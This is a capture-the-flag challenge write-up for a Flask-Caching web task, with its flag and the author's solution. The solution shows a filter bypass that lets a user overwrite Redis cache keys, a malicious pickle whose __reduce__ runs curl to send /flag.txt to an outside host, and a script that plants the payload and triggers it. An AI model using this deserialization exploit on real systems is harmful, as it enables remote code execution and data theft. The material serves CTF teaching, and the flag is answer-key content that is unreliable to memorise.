# Flask-Caching

> Category: Web
> Suggested Points: 300
> Distribute: Dockerfile, app.py, supervisord.conf

# Description

I just found out about redis. Did you know you can use it to cache function responses?

# Deployment

Nothing fancy, just a single container with an internal port of 5000.

# Flag

flag{f1@sK_10rD}

# Solution

The [flask caching](https://pythonhosted.org/Flask-Caching/) library caches function responses 
for a specific amount of time. It pickles the response for a function, then stores it in redis.
The flask caching library calculates the redis key and value for the cached responses 
[here](https://github.com/sh4nks/flask-caching/blob/master/flask_caching/backends/rediscache.py#L103).
Because its just storing pickles in redis, if you can overwrite a redis key with a pickle, you're golden.

- The users can create notes where the title is mapped to the value in redis. This is how they overwrite the flask caching keys. 
- They can then pick one of the couple cached functions i've created say `/test1`. The flask caching lib will make its redis key `flask_cache_view//test1`.
- I do some simple find and replace filtering when creating the note to replace `flask_cache_view//` with an empty string. They need to do some variation of `flask_cache_viewflask_cache_view////` to get the intended key after the replace.
- They then need to construct the pickle. For python3 that would be using the `__reduce__` method on an object. The flask_caching library will only unpickle cached values that start with `!`, so we'll need to prepend that to the payload.

```python
import pickle
import os

class pwn(object):
    def __reduce__(self):
        return os.system, ('curl http://ctf-tools.osiris.cyber.nyu.edu:9999/ --data "$(cat /flag.txt)"',)
        
payload = b'!' + pickle.dumps(pwn())
```

- They should then upload a note with title `flask_cache_viewflask_cache_view////test1` with a file with key content that has the payload. Then go to the endpoint that calls the cached function `/test1`

```
import requests

requests.post(
    'http://localhost:5000/',
    files={"content": io.BytesIO(p)},
    data={"title": "flask_cache_viewflask_cache_view////test1"}
)
requests.get("http://localhost:5000/test1")
```


# Potential Breakage

- Redis being redis and exploding in ram
- Spamming note creation
